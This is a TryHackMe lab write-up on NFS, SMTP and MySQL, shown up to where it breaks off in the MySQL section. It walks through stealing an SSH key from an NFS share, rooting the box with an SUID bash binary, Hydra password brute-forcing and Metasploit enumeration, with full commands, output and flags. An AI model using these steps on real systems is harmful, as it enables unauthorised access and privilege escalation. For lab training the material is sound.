---
title: TryHackMe - Network Services 2
tags:
  - writeup
  - tryhackme
  - nfs
  - smtp
  - mysql
---
Enumerating and Exploiting More Common Network Services & Misconfigurations

## Understanding NFS
#### NFS 101
NFS stands for "Network File System" and allows a system to share directories and files with others over a network. By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file. More at [https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html](https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html).

#### How does NFS work?
First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device. The mount service will then act to connect to the relevant mount daemon using RPC.

The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.

If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:
- The file handle
- The name of the file to be accessed
- The user's, user ID
- The user's group ID

These are used in determining access rights to the specified file. This is what controls user permissions, I.E read and write of files.

#### What runs NFS?
Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.

A computer running Windows Server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows Server to access files stored on a non-Windows NFS server.

#### Answer
What does NFS stand for?
- **Network File System**.

What process allows an NFS client to interact with a remote directory as though it was a physical device?
- **Mounting**.

What does NFS use to represent files and directories on the server?
- **File handle**.

What protocol does NFS use to communicate between the server and client?
- **rpc**.

What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2.
- **user id / group id**.

Can a Windows NFS server share files with a Linux client? (Y/N)
- **Y**.

Can a Linux NFS server share files with a MacOS client? (Y/N)
- **Y**.

What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.
- **4.2**. From [Wikipedia](https://en.wikipedia.org/wiki/Network_File_System).



## Enumerating NFS
#### NFFS-Common
It is important to have this package installed on any machine that uses NFS, either as client or server. It includes programs such as: `lockd`, `statd`, `showmount`, `nfsstat`, `gssd`, `idmapd` and m`ount.nfs`. Primarily, we are concerned with "showmount" and "mount.nfs" as these are going to be most useful to us when it comes to extracting information from the NFS share.

#### Nmap: Port Scanning
Conduct a port scan, to find out as much information as you can about the services, open ports and operating system of the target machine. 
```bash
$ nmap -A -p- vulnerable.com

# -A  : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one
# -p- : Enables scanning across all ports, not just the top 1000
```

#### Mounting NFS shares
Your client’s system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create this folder anywhere on your system. Once you've created this mount point, you can use the "mount" command to connect the NFS share to the mount point on your machine. Like so:
```bash
$ sudo mount -t nfs IP:share /tmp/mount/ -nolock

# EXPLANATION:
# sudo	    Run as root
# mount	    Execute the mount command
# -t nfs	Type of device to mount, then specifying that it's NFS
# IP:share	The IP Address of the NFS server, and the name of the share we wish to mount
# -nolock	Specifies not to use NLM locking
```

#### Answer
Conduct a thorough port scan scan of your choosing, how many ports are open?
```bash
$ nmap -p- -T5 -vv 10.10.56.114    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 01:22 EST
Initiating Ping Scan at 01:22
Scanning 10.10.56.114 [2 ports]
Completed Ping Scan at 01:22, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:22
Completed Parallel DNS resolution of 1 host. at 01:22, 13.01s elapsed
Initiating Connect Scan at 01:22
Scanning 10.10.56.114 [65535 ports]
Discovered open port 111/tcp on 10.10.56.114
Discovered open port 22/tcp on 10.10.56.114
Warning: 10.10.56.114 giving up on port because retransmission cap hit (2).
Discovered open port 33051/tcp on 10.10.56.114
Connect Scan Timing: About 3.37% done; ETC: 01:38 (0:14:49 remaining)
Connect Scan Timing: About 7.62% done; ETC: 01:36 (0:12:20 remaining)
Connect Scan Timing: About 12.18% done; ETC: 01:35 (0:10:56 remaining)
Connect Scan Timing: About 19.23% done; ETC: 01:35 (0:10:09 remaining)
Connect Scan Timing: About 23.76% done; ETC: 01:35 (0:09:21 remaining)
Connect Scan Timing: About 29.66% done; ETC: 01:34 (0:08:06 remaining)
Connect Scan Timing: About 34.71% done; ETC: 01:34 (0:07:22 remaining)
Connect Scan Timing: About 42.46% done; ETC: 01:34 (0:06:48 remaining)
Connect Scan Timing: About 50.11% done; ETC: 01:35 (0:06:11 remaining)
Discovered open port 40451/tcp on 10.10.56.114
Connect Scan Timing: About 55.35% done; ETC: 01:35 (0:05:32 remaining)
Connect Scan Timing: About 60.01% done; ETC: 01:35 (0:04:55 remaining)
Connect Scan Timing: About 65.73% done; ETC: 01:35 (0:04:15 remaining)
Connect Scan Timing: About 71.29% done; ETC: 01:35 (0:03:34 remaining)
Connect Scan Timing: About 76.39% done; ETC: 01:35 (0:02:56 remaining)
Connect Scan Timing: About 82.13% done; ETC: 01:34 (0:02:10 remaining)
Discovered open port 2049/tcp on 10.10.56.114
Connect Scan Timing: About 87.41% done; ETC: 01:34 (0:01:32 remaining)
Connect Scan Timing: About 92.49% done; ETC: 01:35 (0:00:55 remaining)
Discovered open port 35521/tcp on 10.10.56.114
Discovered open port 52865/tcp on 10.10.56.114
Completed Connect Scan at 01:35, 775.99s elapsed (65535 total ports)
Nmap scan report for 10.10.56.114
Host is up, received conn-refused (0.20s latency).
Scanned at 2021-01-07 01:22:33 EST for 789s
Not shown: 64718 closed ports, 810 filtered ports
Reason: 64718 conn-refused and 810 no-responses
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
111/tcp   open  rpcbind syn-ack
2049/tcp  open  nfs     syn-ack
33051/tcp open  unknown syn-ack
35521/tcp open  unknown syn-ack
40451/tcp open  unknown syn-ack
52865/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 789.25 seconds
```
There are **7** ports open.

Which port contains the service we're looking to enumerate?
- **2049**.

Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?
```bash
$ showmount -e 10.10.56.114
Export list for 10.10.56.114:
/home *
```
It's **/home**.

Time to mount the share to our local machine! First, use `mkdir /tmp/mount` to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart.

Then, use the `mount` command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?
```bash
$ sudo mount -t nfs 10.10.56.114:home /tmp/mount/ -nolock
[sudo] password for kali: 
$ cd /tmp/mount   
$ ls
cappucino
```
It's **cappucino** directory.

Have a look inside this directory, look at the files. Looks like  we're inside a user's home directory...
```bash
$ ls -la cappucino 
total 36
drwxr-xr-x 5 kali kali 4096 Jun  4  2020 .
drwxr-xr-x 3 root root 4096 Apr 21  2020 ..
-rw------- 1 kali kali    5 Jun  4  2020 .bash_history
-rw-r--r-- 1 kali kali  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 kali kali 3771 Apr  4  2018 .bashrc
drwx------ 2 kali kali 4096 Apr 22  2020 .cache
drwx------ 3 kali kali 4096 Apr 22  2020 .gnupg
-rw-r--r-- 1 kali kali  807 Apr  4  2018 .profile
drwx------ 2 kali kali 4096 Apr 22  2020 .ssh
-rw-r--r-- 1 kali kali    0 Apr 22  2020 .sudo_as_admin_successful
```

Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?
- **.ssh**.

Which of these keys is most useful to us?
- **id_rsa**.

Copy this file to a different location your local machine, and change the permissions to "600" using "chmod 600 [file]".
```bash
$ cp cappucino/.ssh/id_rsa ~
$ cd ~ 
$ chmod 600 id_rsa
```

Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)
```bash
$ ssh cappucino@10.10.56.114 -i id_rsa                   

Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jan  7 06:42:03 UTC 2021

  System load:  0.0               Processes:           102
  Usage of /:   45.2% of 9.78GB   Users logged in:     0
  Memory usage: 19%               IP address for eth0: 10.10.56.114
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

44 packages can be updated.
0 updates are security updates.


Last login: Thu Jun  4 14:37:50 2020
cappucino@polonfs:~$
```
The answer is **Y**es.



## Exploiting NFS
#### root_squash
By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user "nfsnobody" when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.

#### SUID
So, what are files with the SUID bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!

#### Methodology
This sounds complicated, but really- provided you're familiar with how SUID files work, it's fairly easy to understand. We're able to upload files to the NFS share, and control the permissions of these files. We can set the permissions of whatever we upload, in this case a bash shell executable. We can then log in through SSH, as we did in the previous task- and execute this executable to gain a root shell!

We can use [this](https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash) Ubuntu Server 18.04 bash executable.

#### Recap on What Should We Do
1. NFS Access 
2. Gain Low Privilege Shell 
3. Upload Bash Executable to the NFS share 
4. Set SUID Permissions Through NFS Due To Misconfigured Root Squash 
5. Login through SSH
6. Execute SUID Bit Bash Executable 
7. ROOT ACCESS

#### Answer
First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.
```bash
$ cd /tmp/mount/cappucino
```

Download the bash executable to your Downloads directory. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"
```bash
# Download the bash file
$ wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
...
HTTP request sent, awaiting response... 200 OK
Length: 1113504 (1.1M) [application/octet-stream]
Saving to: ‘bash’

bash                     100%[==================================>]   1.06M  1.87MB/s    in 0.6s    

2021-01-07 01:48:32 (1.87 MB/s) - ‘bash’ saved [1113504/1113504]

$ ls
bash

# Change the permission to user: root
$ ls -l bash 
-rw-r--r-- 1 kali kali 1113504 Jan  7 01:48 bash
$ sudo chown root bash                            
[sudo] password for kali: 
$ ls -l bash     
-rw-r--r-- 1 root kali 1113504 Jan  7 01:48 bash
```

Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?
```bash
$ ls -l bash 
-rw-r--r-- 1 root kali 1113504 Jan  7 01:48 bash
$ sudo chmod +s bash                             
$ ls -l bash 
-rwSr-Sr-- 1 root kali 1113504 Jan  7 01:48 bash
```
It's **s** permission that stands for SUID.

Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like? Make sure that it ends with -sr-x.
```bash
$ ls -l bash 
-rwSr-Sr-- 1 root kali 1113504 Jan  7 01:48 bash
$ sudo chmod o=rx bash                                                                        1 ⨯
$ ls -l bash    
-rwSr-Sr-x 1 root kali 1113504 Jan  7 01:48 bash
```
It's **`-rwSr-Sr-x`**.

Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.
```bash
cappucino@polonfs:~$ ./bash -p
bash-4.4# whoami
root
```

Great! If all's gone well you should have a shell as root! What's the root flag?
```bash
bash-4.4# cd /root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt
THM{nfs_got_pwned}
```
The root flag is **THM{nfs_got_pwned}**.



## Understanding SMTP
#### SMTP - Sending Emails
SMTP stands for "Simple Mail Transfer Protocol". It is utilised to handle the **sending** of emails. In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP. Together they allow the user to send outgoing mail and retrieve incoming mail, respectively.

The SMTP server performs three basic functions:
- It verifies who is sending emails through the SMTP server.
- It sends the outgoing mail
- If the outgoing mail can't be delivered it sends the message back to the sender

#### POP / IMAP - Receiving Emails
POP, or "Post Office Protocol" and IMAP, "Internet Message Access Protocol" are both email protocols who are responsible for the transfer of email between a client and a mail server. The main differences is in POP's more simplistic approach of **downloading the inbox from the mail server, to the client**. Where IMAP will **synchronise the current inbox, with new mail on the server, downloading anything new**. This means that changes to the inbox made on one computer, over IMAP, will persist if you then synchronise the inbox from another computer. The POP/IMAP server is responsible for fulfiling this process.

#### How does SMTP work?
Email delivery functions much the same as the physical mail delivery system. The user will supply the email (a letter) and a service (the postal delivery service), and through a series of steps- will deliver it to the recipients inbox (postbox). The role of the SMTP server in this service, is to act as the sorting office, the email (letter) is picked up and sent to this server, which then directs it to the recipient.

We can map the journey of an email from your computer to the recipient’s like this:
1. The mail user agent, which is either your email client or an external program. connects to the SMTP server of your domain, e.g. smtp.google.com. This initiates the SMTP handshake. This connection works over the SMTP port- which is usually 25. Once these connections have been made and validated, the SMTP session starts.
1. The process of sending mail can now begin. The client first submits the sender, and recipient's email address- the body of the email and any attachments, to the server.
1. The SMTP server then checks whether the domain name of the recipient and the sender is the same.
1. The SMTP server of the sender will make a connection to the recipient's SMTP server before relaying the email. If the recipient's server can't be accessed, or is not available- the Email gets put into an SMTP queue.
1. Then, the recipient's SMTP server will verify the incoming email. It does this by checking if the domain and user name have been recognised. The server will then forward the email to the POP or IMAP server, as shown in the diagram above.
1. The E-Mail will then show up in the recipient's inbox.

#### What runs SMTP?
SMTP Server software is readily available on Windows server platforms, with many other variants of SMTP being available to run on Linux.

#### Answer
What does SMTP stand for?
- **Simple Mail Transfer Protocol**.

What does SMTP handle the sending of?
- **emails**.

What is the first step in the SMTP process?
- **smtp handshake**.

What is the default SMTP port?
- **25**.

Where does the SMTP server send the email if the recipient's server is not available?
- **smtp queue**.

On what server does the Email ultimately end up on?
- **pop/imap**.

Can a Linux machine run an SMTP server? (Y/N)
- **Y**.

Can a Windows machine run an SMTP server? (Y/N)
- **Y**.



## Enumerating SMTP
#### Server Details
Poorly configured or vulnerable mail servers can often provide an initial foothold into a network, but prior to launching an attack, we want to fingerprint the server to make our targeting as precise as possible. We're going to use the "_smtp_version_" module in MetaSploit to do this. As its name implies, it will scan a range of IP addresses and determine the version of any mail servers it encounters.

#### Users from SMTP
The SMTP service has two internal commands that allow the enumeration of users: **VRFY** (confirming the names of valid users) and **EXPN** (which reveals the actual address of user’s aliases and lists of e-mail (mailing lists). Using these SMTP commands, we can reveal a list of valid users

We can do this manually, over a telnet connection- however Metasploit comes to the rescue again, providing a handy module appropriately called "_smtp_enum_" that will do the legwork for us! Using the module is a simple matter of feeding it a host or range of hosts to scan and a wordlist containing usernames to enumerate.

#### Alternatives
there are other, non-metasploit tools such as smtp-user-enum that work even better for enumerating OS-level user accounts on Solaris via the SMTP service. Enumeration is performed by inspecting the responses to VRFY, EXPN, and RCPT TO commands.

This technique could be adapted in future to work against other vulnerable SMTP daemons, but this hasn’t been done as of the time of writing. It's an alternative that's worth keeping in mind if you're trying to distance yourself from using Metasploit e.g. in preparation for OSCP.

#### Answer
First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?
```bash 
$ nmap -A -T5 10.10.50.74     
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 02:26 EST
Warning: 10.10.50.74 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.50.74
Host is up (0.20s latency).
Not shown: 992 closed ports
PORT      STATE    SERVICE         VERSION
22/tcp    open     ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 62:a7:03:13:39:08:5a:07:80:1a:e5:27:ee:9b:22:5d (RSA)
|   256 89:d0:40:92:15:09:39:70:17:6e:c5:de:5b:59:ee:cb (ECDSA)
|_  256 56:7c:d0:c4:95:2b:77:dd:53:d6:e6:73:99:24:f6:86 (ED25519)
25/tcp    open     smtp            Postfix smtpd
|_smtp-commands: polosmtp.home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=polosmtp
| Subject Alternative Name: DNS:polosmtp
| Not valid before: 2020-04-22T18:38:06
|_Not valid after:  2030-04-20T18:38:06
|_ssl-date: TLS randomness does not represent time
1271/tcp  filtered excw
2638/tcp  filtered sybase
5414/tcp  filtered statusd
8081/tcp  filtered blackice-icecap
27715/tcp filtered unknown
32768/tcp filtered filenet-tms
Service Info: Host:  polosmtp.home; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.53 seconds
```
It's at port **25**.

Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?
- **`msfconsole`**.

Let's search for the module "smtp_version", what's it's full module name?
```bash
$ msfconsole 

msf6 > search smtp_version

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/scanner/smtp/smtp_version                   normal  No     SMTP Banner Grabber


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smtp/smtp_version 
```
It's **auxiliary/scanner/smtp/smtp_version**.

Great, now- select the module and list the options. How do we do this?
```bash
msf6 > use 0
msf6 auxiliary(scanner/smtp/smtp_version) > options

Module options (auxiliary/scanner/smtp/smtp_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    25               yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)
```

Have a look through the options, does everything seem correct? What is the option we need to set?
- **RHOSTS**.

Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?
```bash
msf6 auxiliary(scanner/smtp/smtp_version) > set RHOSTS 10.10.50.74
RHOSTS => 10.10.50.74
msf6 auxiliary(scanner/smtp/smtp_version) > exploit 

[+] 10.10.50.74:25        - 10.10.50.74:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
[*] 10.10.50.74:25        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
It's **polosmtp.home**.

What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.
```bash
$ telnet 10.10.50.74 25       
Trying 10.10.50.74...
Connected to 10.10.50.74.
Escape character is '^]'.
220 polosmtp.home ESMTP Postfix (Ubuntu)
```
It's using **Postfix**.

Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module "smtp_enum", what's it's full module name?
```bash
msf6 auxiliary(scanner/smtp/smtp_version) > search smtp_enum

Matching Modules
================

   #  Name                              Disclosure Date  Rank    Check  Description
   -  ----                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/smtp/smtp_enum                   normal  No     SMTP User Enumeration Utility


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smtp/smtp_enum
```
It's **auxiliary/scanner/smtp/smtp_enum**.

We're going to be using the "top-usernames-shortlist.txt" wordlist from the Usernames subsection of seclists (/usr/share/seclists/Usernames if you have it installed).

What option do we need to set to the wordlist's path?
```bash
msf6 auxiliary(scanner/smtp/smtp_enum) > options 

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                                                Required  Description
   ----       ---------------                                                --------  -----------
   RHOSTS                                                                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      25                                                             yes       The target port (TCP)
   THREADS    1                                                              yes       The number of concurrent threads (max one per host)
   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.
```
It's **USER_FILE**.

Once we've set this option, what is the other essential paramater we need to set?
- **RHOSTS**.

Now, set the THREADS parameter to 16 and run the exploit, this may take a few minutes, so grab a cup of tea, coffee, water. Keep yourself hydrated!
```bash
msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 10.10.50.74
RHOSTS => 10.10.50.74
msf6 auxiliary(scanner/smtp/smtp_enum) > set THREADS 16
THREADS => 16
msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
USER_FILE => /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
msf6 auxiliary(scanner/smtp/smtp_enum) > exploit

[*] 10.10.50.74:25        - 10.10.50.74:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
[+] 10.10.50.74:25        - 10.10.50.74:25 Users found: administrator
[*] 10.10.50.74:25        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Okay! Now that's finished, what username is returned?
- **administrator**.



## Exploiting SMTP
#### Recap
Okay, at the end of our Enumeration section we have a few vital pieces of information:
1. A user account name
1. The type of SMTP server and Operating System running.

We know from our port scan, that the only other open port on this machine is an SSH login. We're going to use this information to try and **bruteforce** the password of the SSH login for our user using Hydra.

#### Hydra - for Bruteforcing
here is a wide array of customisability when it comes to using Hydra, and it allows for adaptive password attacks against of many different services, including SSH. 

The syntax for the command we're going to use to find the passwords is this:
```bash
$ hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.50.74 ssh

# hydra	            Runs the hydra tool
#-t 16              Number of parallel connections per target
# -l                [user]	Points to the user who's account you're trying to compromise
# -P                [path to dictionary]	Points to the file containing the list of possible passwords
# -vV               Sets verbose mode to very verbose, shows the login+pass combination for each attempt
# [machine IP]	    The IP address of the target machine
# ssh / protocol    Sets the protocol
```

#### Answer
What is the password of the user we found during our enumeration stage?
```bash
$ hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt.gz 10.10.50.74 ssh  
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-07 03:03:12
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.50.74:22/
[22][ssh] host: 10.10.50.74   login: administrator   password: alejandro
```
The password is **alejandro**.

Great! Now, let's SSH into the server as the user, what is contents of smtp.txt
```bash
$ ssh administrator@10.10.50.74 

administrator@10.10.50.74 password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jan  7 08:05:21 UTC 2021

  System load:  0.02              Processes:           92
  Usage of /:   43.9% of 9.78GB   Users logged in:     0
  Memory usage: 17%               IP address for eth0: 10.10.50.74
  Swap usage:   0%


87 packages can be updated.
35 updates are security updates.


Last login: Wed Apr 22 22:21:42 2020 from 192.168.1.110
administrator@polosmtp:~$ ls
dead.letter  Maildir  smtp.txt
administrator@polosmtp:~$ cat smtp.txt 
THM{who_knew_email_servers_were_c00l?}
```
The flag is **THM{who_knew_email_servers_were_c00l?}**.



## Understanding MySQL
#### Definition
In its simplest definition, MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL) that using client-server as the communication model. MySQL can run on various platforms, whether it's Linux or windows. It is commonly used as a back end database for many prominent websites and forms an essential component of the LAMP stack, which includes: Linux, Apache, MySQL, and PHP.

### How does MySQL work?
MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of mySQL databases.

The server handles all database instructions like creating editing and accessing data. It takes, and manages these requests and communicates using the MySQL protocol. This whole process can be broken down into these stages:
1. MySQL creates a database for storing and manipulating data, defining the relationship of each table.
1. Clients make requests by making specific statements in SQL.
1. The server will respond to the client with whatever information has been requested

### Answer
What type of software is MySQL?
- **relational database management system**.

What language is MySQL based on?
- **sql**.

What communication model does MySQL use?
- **client-server**.

What is a common application of MySQL?
- **back end database**.

What major social network uses MySQL as their back-end database? This will require further research.
- **facebook**.



## Enumerating MySQL
MySQL is likely not going to be the first point of call when it comes to getting initial information about the server. You can, as we have in previous tasks, attempt to brute-force default account passwords if you really don't have any other information- however in most CTF scenarios, this is unlikely to be the avenue you're meant to pursue.

#### Scenario
Typically, you will have gained some initial credentials from enumerating other services, that you can then use to enumerate, and exploit the MySQL service. As this room focuses on exploiting and enumerating the network service, for the sake of the scenario, we're going to assume that you found the **credentials: "root:password"** while enumerating subdomains of a web server. After trying the login against SSH unsuccessfully, you decide to try it against MySQL.

#### Alternatives
As with the previous task, it's worth noting that everything we're going to be doing using Metasploit can also be done either manually, or with a set of non-metasploit tools such as nmap's mysql-enum script: [https://nmap.org/nsedoc/scripts/mysql-enum.html](https://nmap.org/nsedoc/scripts/mysql-enum.html) or [https://www.exploit-db.com/exploits/23081](https://www.exploit-db.com/exploits/23081).

#### Answer
As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?
```bash
$ nmap -A -T5  10.10.39.195
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 03:40 EST
Nmap scan report for 10.10.39.195
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:36:56:2f:f0:d4:a4:d2:ab:6a:43:3e:c0:f9:9b:2d (RSA)
|   256 30:bd:be:28:bd:32:dc:f6:ff:28:b2:57:57:31:d9:cf (ECDSA)
|_  256 f2:3b:82:4a:5c:d2:18:19:89:1f:cd:92:0a:c7:cf:65 (ED25519)
3306/tcp open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.29-0ubuntu0.18.04.1
|   Thread ID: 4
|   Capabilities flags: 65535
|   Some Capabilities: DontAllowDatabaseTableColumn, Speaks41ProtocolNew, Speaks41ProtocolOld, FoundRows, LongColumnFlag, Support41Auth, SwitchToSSLAfterHandshake, ConnectWithDatabase, SupportsTransactions, IgnoreSigpipes, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsCompression, LongPassword, ODBCClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: &EyEz \x13Vj\x0CUd\x0D\x0E    "g5b3
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_5.7.29_Auto_Generated_Server_Certificate
| Not valid before: 2020-04-23T10:13:27
|_Not valid after:  2030-04-21T10:13:27
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.48 seconds
```
Port **3306**.

Good, now- we think we have a set of credentials. Let's double check that by manually connecting to the MySQL server. We can do this using the command "mysql -h [IP] -u [username] -p"
```bash
$ mysql -h 10.10.39.195 -u root -p                                                            1 ⨯
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 12
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> exit
Bye
```

Okay, we know that our login credentials work. Lets quit out of this session with "exit" and launch up Metasploit.
```bash
MySQL [(none)]> exit
Bye

$ msfconsole
```

We're going to be using the "mysql_sql" module. Search for, select and list the options it needs. What three options do we need to set? (in descending order).
```bash
msf6 > search mysql_sql

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/admin/mysql/mysql_sql                   normal  No     MySQL SQL Generic Query


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/mysql/mysql_sql

msf6 > use 0
msf6 auxiliary(admin/mysql/mysql_sql) > options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   PASSWORD                    no        The password for the specified username
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     3306              yes       The target port (TCP)
   SQL       select version()  yes       The SQL to execute.
   USERNAME                    no        The username to authenticate as
```
It's **PASSWORD/RHOST/USERNAME**.

Run the exploit. By default it will test with the "select module()" command, what result does this give you?
```bash
msf6 auxiliary(admin/mysql/mysql_sql) > set RHOSTS 10.10.39.195
RHOSTS => 10.10.39.195
msf6 auxiliary(admin/mysql/mysql_sql) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
USERNAME => root
msf6 auxiliary(admin/mysql/mysql_sql) > exploit 
[*] Running module against 10.10.39.195

[*] 10.10.39.195:3306 - Sending statement: 'select version()'...
[*] 10.10.39.195:3306 -  | 5.7.29-0ubuntu0.18.04.1 |
[*] Auxiliary module execution completed
```
It's **5.7.29-0ubuntu0.18.04.1**.

Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the "sql" option to "show databases". how many databases are returned?
```bash
msf6 auxiliary(admin/mysql/mysql_sql) > set SQL SHOW DATABASES
SQL => SHOW DATABASES
